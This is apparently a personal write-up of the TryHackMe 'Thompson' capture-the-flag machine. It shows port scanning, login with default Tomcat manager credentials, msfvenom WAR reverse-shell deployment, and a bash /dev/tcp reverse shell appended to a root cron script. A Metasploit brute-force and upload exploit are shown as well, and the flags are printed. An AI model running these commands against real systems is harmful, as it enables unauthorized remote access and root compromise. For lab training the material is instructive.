---
boot2root machine for FIT and bsides guatemala CTF
---

![](https://tryhackme-images.s3.amazonaws.com/room-icons/f5e35bf1d933a9b45077e5388635a593.png)

 ### Thompson

 Start Machine

read user.txt and root.txt

Answer the questions below

```
┌──(kali㉿kali)-[/]
└─$ rustscan -a 10.10.103.186 --ulimit 5500 -b 65535 -- -A
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Real hackers hack time ⌛

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.103.186:22
Open 10.10.103.186:8009
Open 10.10.103.186:8080
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-27 18:00 EST
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 18:00
Completed NSE at 18:00, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 18:00
Completed NSE at 18:00, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 18:00
Completed NSE at 18:00, 0.00s elapsed
Initiating Ping Scan at 18:00
Scanning 10.10.103.186 [2 ports]
Completed Ping Scan at 18:00, 0.20s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 18:00
Completed Parallel DNS resolution of 1 host. at 18:00, 0.02s elapsed
DNS resolution of 1 IPs took 0.02s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 18:00
Scanning 10.10.103.186 [3 ports]
Discovered open port 8080/tcp on 10.10.103.186
Discovered open port 22/tcp on 10.10.103.186
Discovered open port 8009/tcp on 10.10.103.186
Completed Connect Scan at 18:00, 0.20s elapsed (3 total ports)
Initiating Service scan at 18:00
Scanning 3 services on 10.10.103.186
Completed Service scan at 18:00, 8.29s elapsed (3 services on 1 host)
NSE: Script scanning 10.10.103.186.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 18:00
Completed NSE at 18:00, 7.94s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 18:00
Completed NSE at 18:00, 0.84s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 18:00
Completed NSE at 18:00, 0.00s elapsed
Nmap scan report for 10.10.103.186
Host is up, received conn-refused (0.20s latency).
Scanned at 2022-12-27 18:00:16 EST for 18s

PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 fc052481987eb8db0592a6e78eb02111 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDL+0hfJnh2z0jia21xVo/zOSRmzqE/qWyQv1G+8EJNXze3WPjXsC54jYeO0lp2SGq+sauzNvmWrHcrLKHtugMUQmkS9gD/p4zx4LjuG0WKYYeyLybs4WrTTmCU8PYGgmud9SwrDlEjX9AOEZgP/gj1FY+x+TfOtIT2OEE0Exvb86LhPj/AqdahABfCfxzHQ9ZyS6v4SMt/AvpJs6Dgady20CLxhYGY9yR+V4JnNl4jxwg2j64EGLx4vtCWNjwP+7ROkTmP6dzR7DxsH1h8Ko5C45HbTIjFzUmrJ1HMPZMo9ss0MsmeXPnZTmp5TxsxbLNJGSbDv7BS9gdCyTf0+Qq1
|   256 60c840abb009843d46646113fabc1fbe (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBG6CiO2B7Uei2whKgUHjLmGY7dq1uZFhZ3wY5EWj5L7ylSj+bx5pwaiEgU/Velkp4ZWXM//thL6K1lAAPGLxHMM=
|   256 b5527e9c019b980c73592035ee23f1a5 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIwYtK4oCnQLSoBYAztlgcEsq8FLNL48LyxC2RfxC+33
8009/tcp open  ajp13   syn-ack Apache Jserv (Protocol v1.3)
|_ajp-methods: Failed to get a valid response for the OPTION request
8080/tcp open  http    syn-ack Apache Tomcat 8.5.5
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-favicon: Apache Tomcat
|_http-title: Apache Tomcat/8.5.5
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 18:00
Completed NSE at 18:00, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 18:00
Completed NSE at 18:00, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 18:00
Completed NSE at 18:00, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.95 seconds

click in Manager App to login

https://github.com/netbiosX/Default-Credentials/blob/master/Apache-Tomcat-Default-Passwords.mdown

http://10.10.103.186:8080/manager/html

and there are credentials

<role rolename="manager-gui"/>
<user username="tomcat" password="s3cret" roles="manager-gui"/>

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#war

now upload reverse.war

┌──(root㉿kali)-[/]
└─# msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.8.19.103 LPORT=4242 -f war > reverse.war

Payload size: 1097 bytes
Final size of war file: 1097 bytes

revshell 

┌──(root㉿kali)-[/]
└─# rlwrap nc -lvnp 4242
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::4242
Ncat: Listening on 0.0.0.0:4242

after deploy check /reverse path

┌──(root㉿kali)-[/home/kali]
└─# rlwrap nc -lvnp 4242
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::4242
Ncat: Listening on 0.0.0.0:4242
Ncat: Connection from 10.10.103.186.
Ncat: Connection from 10.10.103.186:43690.
whoami
tomcat
export TERM=xterm
export SHELL=bash
which python3
/usr/bin/python3
python3 -c 'import pty;pty.spawn("/bin/bash")'
tomcat@ubuntu:/$ pwd
pwd
/
tomcat@ubuntu:/$ ls
ls
bin   etc         initrd.img.old  lost+found  opt   run   sys  var
boot  home        lib             media       proc  sbin  tmp  vmlinuz
dev   initrd.img  lib64           mnt         root  srv   usr  vmlinuz.old
tomcat@ubuntu:/$ find / -type f -name user.txt 2>dev/null
find / -type f -name user.txt 2>dev/null
/home/jack/user.txt
tomcat@ubuntu:/$ cd /home/jack
cd /home/jack
tomcat@ubuntu:/home/jack$ ls
ls
id.sh  test.txt  user.txt
tomcat@ubuntu:/home/jack$ cat user.txt
cat user.txt
39400c90bc683a41a8935e4719f181bf

priv esc

tomcat@ubuntu:/home/jack$ find / -perm -4000 2>/dev/null | xargs ls -lah
find / -perm -4000 2>/dev/null | xargs ls -lah
-rwsr-xr-x 1 root root        31K Jul 12  2016 /bin/fusermount
-rwsr-xr-x 1 root root        40K May 15  2019 /bin/mount
-rwsr-xr-x 1 root root        44K May  7  2014 /bin/ping
-rwsr-xr-x 1 root root        44K May  7  2014 /bin/ping6
-rwsr-xr-x 1 root root        40K Mar 26  2019 /bin/su
-rwsr-xr-x 1 root root        27K May 15  2019 /bin/umount
-rwsr-xr-x 1 root root        71K Mar 26  2019 /usr/bin/chfn
-rwsr-xr-x 1 root root        40K Mar 26  2019 /usr/bin/chsh
-rwsr-xr-x 1 root root        74K Mar 26  2019 /usr/bin/gpasswd
-rwsr-xr-x 1 root root        39K Mar 26  2019 /usr/bin/newgrp
-rwsr-xr-x 1 root root        53K Mar 26  2019 /usr/bin/passwd
-rwsr-xr-x 1 root root       134K Jun 10  2019 /usr/bin/sudo
-rwsr-xr-x 1 root root        11K May  8  2018 /usr/bin/vmware-user-suid-wrapper
-rwsr-xr-- 1 root messagebus  42K Jun 10  2019 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root        10K Mar 27  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root       419K Mar  4  2019 /usr/lib/openssh/ssh-keysign

tomcat@ubuntu:/home/jack$ cat /etc/crontab
cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
*  *    * * *   root    cd /home/jack && bash id.sh

tomcat@ubuntu:/home/jack$ cat id.sh
cat id.sh
#!/bin/bash
id > test.txt

tomcat@ubuntu:/home/jack$ cat test.txt
cat test.txt
uid=0(root) gid=0(root) groups=0(root)

tomcat@ubuntu:/home/jack$ echo "/bin/bash -i >& /dev/tcp/10.8.19.103/1337 0>&1" >> id.sh
>> id.shin/bash -i >& /dev/tcp/10.8.19.103/1337 0>&1" 


┌──(root㉿kali)-[/home/kali]
└─# rlwrap nc -lvnp 1337
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::1337
Ncat: Listening on 0.0.0.0:1337
Ncat: Connection from 10.10.103.186.
Ncat: Connection from 10.10.103.186:39588.
bash: cannot set terminal process group (1065): Inappropriate ioctl for device
bash: no job control in this shell
root@ubuntu:/home/jack# cd /root
cd /root
root@ubuntu:~# ls
ls
root.txt
root@ubuntu:~# cat root.txt
cat root.txt
d89d5391984c0450a95497153ae7ca3a

--another way using metasploit


┌──(kali㉿kali)-[~]
└─$ msfconsole -q
msf6 > search tomcat_mgr_login

Matching Modules
================

   #  Name                                     Disclosure Date  Rank    Check  Description
   -  ----                                     ---------------  ----    -----  -----------
   0  auxiliary/scanner/http/tomcat_mgr_login                   normal  No     Tomcat Application Manager Login Utility


Interact with a module by name or index. For example info 0, use 0 or use auxiliary/scanner/http/tomcat_mgr_login                                                                                                           

msf6 > use 0
msf6 auxiliary(scanner/http/tomcat_mgr_login) > show options

Module options (auxiliary/scanner/http/tomcat_mgr_login):

   Name              Current Setting              Required  Description
   ----              ---------------              --------  -----------
   BLANK_PASSWORDS   false                        no        Try blank passwords for all users
   BRUTEFORCE_SPEED  5                            yes       How fast to bruteforce, from 0 to 5
   DB_ALL_CREDS      false                        no        Try each user/password couple stored in the curr
                                                            ent database
   DB_ALL_PASS       false                        no        Add all passwords in the current database to the
                                                             list
   DB_ALL_USERS      false                        no        Add all users in the current database to the lis
                                                            t
   DB_SKIP_EXISTING  none                         no        Skip existing credentials stored in the current
                                                            database (Accepted: none, user, user&realm)
   PASSWORD                                       no        The HTTP password to specify for authentication
   PASS_FILE         /usr/share/metasploit-frame  no        File containing passwords, one per line
                     work/data/wordlists/tomcat_
                     mgr_default_pass.txt
   Proxies                                        no        A proxy chain of format type:host:port[,type:hos
                                                            t:port][...]
   RHOSTS                                         yes       The target host(s), see https://github.com/rapid
                                                            7/metasploit-framework/wiki/Using-Metasploit
   RPORT             8080                         yes       The target port (TCP)
   SSL               false                        no        Negotiate SSL/TLS for outgoing connections
   STOP_ON_SUCCESS   false                        yes       Stop guessing when a credential works for a host
   TARGETURI         /manager/html                yes       URI for Manager login. Default is /manager/html
   THREADS           1                            yes       The number of concurrent threads (max one per ho
                                                            st)
   USERNAME                                       no        The HTTP username to specify for authentication
   USERPASS_FILE     /usr/share/metasploit-frame  no        File containing users and passwords separated by
                     work/data/wordlists/tomcat_             space, one pair per line
                     mgr_default_userpass.txt
   USER_AS_PASS      false                        no        Try the username as the password for all users
   USER_FILE         /usr/share/metasploit-frame  no        File containing users, one per line
                     work/data/wordlists/tomcat_
                     mgr_default_users.txt
   VERBOSE           true                         yes       Whether to print output for all attempts
   VHOST                                          no        HTTP server virtual host


View the full module info with the info, or info -d command.

msf6 auxiliary(scanner/http/tomcat_mgr_login) > set RHOSTS 10.10.103.186
RHOSTS => 10.10.103.186
msf6 auxiliary(scanner/http/tomcat_mgr_login) > exploit

[!] No active DB -- Credential data will not be saved!
[-] 10.10.103.186:8080 - LOGIN FAILED: admin:admin (Incorrect)
[-] 10.10.103.186:8080 - LOGIN FAILED: admin:manager (Incorrect)
[-] 10.10.103.186:8080 - LOGIN FAILED: admin:role1 (Incorrect)
[-] 10.10.103.186:8080 - LOGIN FAILED: admin:root (Incorrect)
[-] 10.10.103.186:8080 - LOGIN FAILED: admin:tomcat (Incorrect)
[-] 10.10.103.186:8080 - LOGIN FAILED: admin:s3cret (Incorrect)
[-] 10.10.103.186:8080 - LOGIN FAILED: admin:vagrant (Incorrect)
[-] 10.10.103.186:8080 - LOGIN FAILED: admin:QLogic66 (Incorrect)
[-] 10.10.103.186:8080 - LOGIN FAILED: admin:password (Incorrect)
[-] 10.10.103.186:8080 - LOGIN FAILED: admin:Password1 (Incorrect)
[-] 10.10.103.186:8080 - LOGIN FAILED: admin:changethis (Incorrect)
[-] 10.10.103.186:8080 - LOGIN FAILED: admin:r00t (Incorrect)
[-] 10.10.103.186:8080 - LOGIN FAILED: admin:toor (Incorrect)
[-] 10.10.103.186:8080 - LOGIN FAILED: admin:password1 (Incorrect)
[-] 10.10.103.186:8080 - LOGIN FAILED: admin:j2deployer (Incorrect)
[-] 10.10.103.186:8080 - LOGIN FAILED: admin:OvW*busr1 (Incorrect)
[-] 10.10.103.186:8080 - LOGIN FAILED: admin:kdsxc (Incorrect)
[-] 10.10.103.186:8080 - LOGIN FAILED: admin:owaspba (Incorrect)
[-] 10.10.103.186:8080 - LOGIN FAILED: admin:ADMIN (Incorrect)
[-] 10.10.103.186:8080 - LOGIN FAILED: admin:xampp (Incorrect)
[-] 10.10.103.186:8080 - LOGIN FAILED: manager:admin (Incorrect)
[-] 10.10.103.186:8080 - LOGIN FAILED: manager:manager (Incorrect)
[-] 10.10.103.186:8080 - LOGIN FAILED: manager:role1 (Incorrect)
[-] 10.10.103.186:8080 - LOGIN FAILED: manager:root (Incorrect)
[-] 10.10.103.186:8080 - LOGIN FAILED: manager:tomcat (Incorrect)
[-] 10.10.103.186:8080 - LOGIN FAILED: manager:s3cret (Incorrect)
[-] 10.10.103.186:8080 - LOGIN FAILED: manager:vagrant (Incorrect)
[-] 10.10.103.186:8080 - LOGIN FAILED: manager:QLogic66 (Incorrect)
[-] 10.10.103.186:8080 - LOGIN FAILED: manager:password (Incorrect)
[-] 10.10.103.186:8080 - LOGIN FAILED: manager:Password1 (Incorrect)
[-] 10.10.103.186:8080 - LOGIN FAILED: manager:changethis (Incorrect)
[-] 10.10.103.186:8080 - LOGIN FAILED: manager:r00t (Incorrect)
[-] 10.10.103.186:8080 - LOGIN FAILED: manager:toor (Incorrect)
[-] 10.10.103.186:8080 - LOGIN FAILED: manager:password1 (Incorrect)
[-] 10.10.103.186:8080 - LOGIN FAILED: manager:j2deployer (Incorrect)
[-] 10.10.103.186:8080 - LOGIN FAILED: manager:OvW*busr1 (Incorrect)
[-] 10.10.103.186:8080 - LOGIN FAILED: manager:kdsxc (Incorrect)
[-] 10.10.103.186:8080 - LOGIN FAILED: manager:owaspba (Incorrect)
[-] 10.10.103.186:8080 - LOGIN FAILED: manager:ADMIN (Incorrect)
[-] 10.10.103.186:8080 - LOGIN FAILED: manager:xampp (Incorrect)
[-] 10.10.103.186:8080 - LOGIN FAILED: role1:admin (Incorrect)
[-] 10.10.103.186:8080 - LOGIN FAILED: role1:manager (Incorrect)
[-] 10.10.103.186:8080 - LOGIN FAILED: role1:role1 (Incorrect)
[-] 10.10.103.186:8080 - LOGIN FAILED: role1:root (Incorrect)
[-] 10.10.103.186:8080 - LOGIN FAILED: role1:tomcat (Incorrect)
[-] 10.10.103.186:8080 - LOGIN FAILED: role1:s3cret (Incorrect)
[-] 10.10.103.186:8080 - LOGIN FAILED: role1:vagrant (Incorrect)
[-] 10.10.103.186:8080 - LOGIN FAILED: role1:QLogic66 (Incorrect)
[-] 10.10.103.186:8080 - LOGIN FAILED: role1:password (Incorrect)
[-] 10.10.103.186:8080 - LOGIN FAILED: role1:Password1 (Incorrect)
[-] 10.10.103.186:8080 - LOGIN FAILED: role1:changethis (Incorrect)
[-] 10.10.103.186:8080 - LOGIN FAILED: role1:r00t (Incorrect)
[-] 10.10.103.186:8080 - LOGIN FAILED: role1:toor (Incorrect)
[-] 10.10.103.186:8080 - LOGIN FAILED: role1:password1 (Incorrect)
[-] 10.10.103.186:8080 - LOGIN FAILED: role1:j2deployer (Incorrect)
[-] 10.10.103.186:8080 - LOGIN FAILED: role1:OvW*busr1 (Incorrect)
[-] 10.10.103.186:8080 - LOGIN FAILED: role1:kdsxc (Incorrect)
[-] 10.10.103.186:8080 - LOGIN FAILED: role1:owaspba (Incorrect)
[-] 10.10.103.186:8080 - LOGIN FAILED: role1:ADMIN (Incorrect)
[-] 10.10.103.186:8080 - LOGIN FAILED: role1:xampp (Incorrect)
[-] 10.10.103.186:8080 - LOGIN FAILED: role:admin (Incorrect)
[-] 10.10.103.186:8080 - LOGIN FAILED: role:manager (Incorrect)
[-] 10.10.103.186:8080 - LOGIN FAILED: role:role1 (Incorrect)
[-] 10.10.103.186:8080 - LOGIN FAILED: role:root (Incorrect)
[-] 10.10.103.186:8080 - LOGIN FAILED: role:tomcat (Incorrect)
[-] 10.10.103.186:8080 - LOGIN FAILED: role:s3cret (Incorrect)
[-] 10.10.103.186:8080 - LOGIN FAILED: role:vagrant (Incorrect)
[-] 10.10.103.186:8080 - LOGIN FAILED: role:QLogic66 (Incorrect)
[-] 10.10.103.186:8080 - LOGIN FAILED: role:password (Incorrect)
[-] 10.10.103.186:8080 - LOGIN FAILED: role:Password1 (Incorrect)
[-] 10.10.103.186:8080 - LOGIN FAILED: role:changethis (Incorrect)
[-] 10.10.103.186:8080 - LOGIN FAILED: role:r00t (Incorrect)
[-] 10.10.103.186:8080 - LOGIN FAILED: role:toor (Incorrect)
[-] 10.10.103.186:8080 - LOGIN FAILED: role:password1 (Incorrect)
[-] 10.10.103.186:8080 - LOGIN FAILED: role:j2deployer (Incorrect)
[-] 10.10.103.186:8080 - LOGIN FAILED: role:OvW*busr1 (Incorrect)
[-] 10.10.103.186:8080 - LOGIN FAILED: role:kdsxc (Incorrect)
[-] 10.10.103.186:8080 - LOGIN FAILED: role:owaspba (Incorrect)
[-] 10.10.103.186:8080 - LOGIN FAILED: role:ADMIN (Incorrect)
[-] 10.10.103.186:8080 - LOGIN FAILED: role:xampp (Incorrect)
[-] 10.10.103.186:8080 - LOGIN FAILED: root:admin (Incorrect)
[-] 10.10.103.186:8080 - LOGIN FAILED: root:manager (Incorrect)
[-] 10.10.103.186:8080 - LOGIN FAILED: root:role1 (Incorrect)
[-] 10.10.103.186:8080 - LOGIN FAILED: root:root (Incorrect)
[-] 10.10.103.186:8080 - LOGIN FAILED: root:tomcat (Incorrect)
[-] 10.10.103.186:8080 - LOGIN FAILED: root:s3cret (Incorrect)
[-] 10.10.103.186:8080 - LOGIN FAILED: root:vagrant (Incorrect)
[-] 10.10.103.186:8080 - LOGIN FAILED: root:QLogic66 (Incorrect)
[-] 10.10.103.186:8080 - LOGIN FAILED: root:password (Incorrect)
[-] 10.10.103.186:8080 - LOGIN FAILED: root:Password1 (Incorrect)
[-] 10.10.103.186:8080 - LOGIN FAILED: root:changethis (Incorrect)
[-] 10.10.103.186:8080 - LOGIN FAILED: root:r00t (Incorrect)
[-] 10.10.103.186:8080 - LOGIN FAILED: root:toor (Incorrect)
[-] 10.10.103.186:8080 - LOGIN FAILED: root:password1 (Incorrect)
[-] 10.10.103.186:8080 - LOGIN FAILED: root:j2deployer (Incorrect)
[-] 10.10.103.186:8080 - LOGIN FAILED: root:OvW*busr1 (Incorrect)
[-] 10.10.103.186:8080 - LOGIN FAILED: root:kdsxc (Incorrect)
[-] 10.10.103.186:8080 - LOGIN FAILED: root:owaspba (Incorrect)
[-] 10.10.103.186:8080 - LOGIN FAILED: root:ADMIN (Incorrect)
[-] 10.10.103.186:8080 - LOGIN FAILED: root:xampp (Incorrect)
[-] 10.10.103.186:8080 - LOGIN FAILED: tomcat:admin (Incorrect)
[-] 10.10.103.186:8080 - LOGIN FAILED: tomcat:manager (Incorrect)
[-] 10.10.103.186:8080 - LOGIN FAILED: tomcat:role1 (Incorrect)
[-] 10.10.103.186:8080 - LOGIN FAILED: tomcat:root (Incorrect)
[-] 10.10.103.186:8080 - LOGIN FAILED: tomcat:tomcat (Incorrect)
[-] 10.10.103.186:8080 - LOGIN FAILED: tomcat:s3cret (Incorrect)
[-] 10.10.103.186:8080 - LOGIN FAILED: tomcat:vagrant (Incorrect)
[-] 10.10.103.186:8080 - LOGIN FAILED: tomcat:QLogic66 (Incorrect)
[-] 10.10.103.186:8080 - LOGIN FAILED: tomcat:password (Incorrect)
[-] 10.10.103.186:8080 - LOGIN FAILED: tomcat:Password1 (Incorrect)
[-] 10.10.103.186:8080 - LOGIN FAILED: tomcat:changethis (Incorrect)
[-] 10.10.103.186:8080 - LOGIN FAILED: tomcat:r00t (Incorrect)
[-] 10.10.103.186:8080 - LOGIN FAILED: tomcat:toor (Incorrect)
[-] 10.10.103.186:8080 - LOGIN FAILED: tomcat:password1 (Incorrect)
[-] 10.10.103.186:8080 - LOGIN FAILED: tomcat:j2deployer (Incorrect)
[-] 10.10.103.186:8080 - LOGIN FAILED: tomcat:OvW*busr1 (Incorrect)
[-] 10.10.103.186:8080 - LOGIN FAILED: tomcat:kdsxc (Incorrect)
[-] 10.10.103.186:8080 - LOGIN FAILED: tomcat:owaspba (Incorrect)
[-] 10.10.103.186:8080 - LOGIN FAILED: tomcat:ADMIN (Incorrect)
[-] 10.10.103.186:8080 - LOGIN FAILED: tomcat:xampp (Incorrect)
[-] 10.10.103.186:8080 - LOGIN FAILED: both:admin (Incorrect)
[-] 10.10.103.186:8080 - LOGIN FAILED: both:manager (Incorrect)
[-] 10.10.103.186:8080 - LOGIN FAILED: both:role1 (Incorrect)
[-] 10.10.103.186:8080 - LOGIN FAILED: both:root (Incorrect)
[-] 10.10.103.186:8080 - LOGIN FAILED: both:tomcat (Incorrect)
^C[*] Caught interrupt from the console...
[*] Auxiliary module execution completed

uhmm 

┌──(kali㉿kali)-[~]
└─$ msfconsole -q -x 'use exploit/multi/http/tomcat_mgr_upload;set RHOSTS 10.10.103.186;set RPORT 8080;set HttpUsername tomcat;set HttpPassword s3cret;set LHOST 10.8.19.103;set LPORT 1235;run'
[*] No payload configured, defaulting to java/meterpreter/reverse_tcp
RHOSTS => 10.10.103.186
RPORT => 8080
HttpUsername => tomcat
HttpPassword => s3cret
LHOST => 10.8.19.103
LPORT => 1235
[*] Started reverse TCP handler on 10.8.19.103:1235 
[*] Retrieving session ID and CSRF token...
[*] Uploading and deploying O7Ig1RhI0u0fXnk15DvUaUc...
[*] Executing O7Ig1RhI0u0fXnk15DvUaUc...
[*] Sending stage (58829 bytes) to 10.10.103.186
[*] Undeploying O7Ig1RhI0u0fXnk15DvUaUc ...
[*] Undeployed at /manager/html/undeploy
[*] Meterpreter session 1 opened (10.8.19.103:1235 -> 10.10.103.186:58616) at 2022-12-27 19:08:03 -0500

meterpreter > shell
Process 1 created.
Channel 1 created.
python -c 'import pty;pty.spawn("/bin/bash")'

tomcat@ubuntu:/$ ls
ls
bin   etc         initrd.img.old  lost+found  opt   run   sys  var
boot  home        lib             media       proc  sbin  tmp  vmlinuz
dev   initrd.img  lib64           mnt         root  srv   usr  vmlinuz.old
tomcat@ubuntu:/$ background
background
No command 'background' found, did you mean:
 Command 'gbackground' from package 'gbackground' (universe)
background: command not found
tomcat@ubuntu:/$ ^Z
Background channel 1? [y/N]  y

meterpreter > search -f user.txt
Found 1 result...
=================

Path                 Size (bytes)  Modified (UTC)
----                 ------------  --------------
/home/jack/user.txt  33            2019-08-14 13:14:21 -0400

meterpreter > hashdump
[-] The "hashdump" command requires the "priv" extension to be loaded (run: `load priv`)
meterpreter > load priv
Loading extension priv...
[-] Failed to load extension: The "priv" extension is not supported by this Meterpreter type (java/linux)
[-] The "priv" extension is supported by the following Meterpreter payloads:
[-]   - windows/x64/meterpreter*
[-]   - windows/meterpreter*


It works :)


```

![[Pasted image 20221227180756.png]]

![[Pasted image 20221227182513.png]]

![[Pasted image 20221227182639.png]]

user.txt  

*39400c90bc683a41a8935e4719f181bf*

root.txt

*d89d5391984c0450a95497153ae7ca3a*


[[The Cod Caper]]